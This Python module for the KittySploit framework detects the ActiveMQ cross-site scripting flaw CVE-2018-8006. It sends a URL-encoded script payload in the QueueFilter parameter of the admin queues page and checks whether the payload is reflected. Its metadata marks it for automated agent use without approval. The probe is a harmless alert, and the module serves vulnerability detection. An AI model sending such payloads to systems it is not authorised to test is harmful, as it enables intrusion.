#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache ActiveMQ versions 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache ActiveMQ <=5.15.5 - Cross-Site Scripting Detection',
        'description': 'Apache ActiveMQ versions 5.0.0 to 5.15.5 are vulnerable to cross-site scripting via the web based administration console on the queue.jsp page. The root cause of this issue is improper data filtering of the QueueFilter parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'apache', 'activemq', 'xss', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'http://activemq.apache.org/security-advisories.data/CVE-2018-8006-announcement.txt',
            'https://lists.apache.org/thread.html/2b5c0039197a4949f29e1e2c9441ab38d242946b966f61c110808bcc@%3Ccommits.activemq.apache.org%3E',
            'https://lists.apache.org/thread.html/fcbe6ad00f1de142148c20d813fae3765dc4274955e3e2f3ca19ff7b@%3Cdev.activemq.apache.org%3E',
            'https://lists.apache.org/thread.html/a859563f05fbe7c31916b3178c2697165bd9bbf5a65d1cf62aef27d2@%3Ccommits.activemq.apache.org%3E',
            'https://lists.apache.org/thread.html/03f91b1fb85686a848cee6b90112cf6059bd1b21b23bacaa11a962e1@%3Cdev.activemq.apache.org%3E',
        ],
        'cve': 'CVE-2018-8006',
    }

    def run(self):
        r = self.http_request(method="GET", path='/admin/queues.jsp?QueueFilter=yu1ey%22%3e%3cscript%3ealert(%221%22)%3c%2fscript%3eqb68', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('"><script>alert("1")</script>',)
        header_any = ('/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Apache ActiveMQ <=5.15.5 - Cross-Site Scripting detected",
                path='/admin/queues.jsp?QueueFilter=yu1ey%22%3e%3cscript%3ealert(%221%22)%3c%2fscript%3eqb68',
            )
            return True
        return False

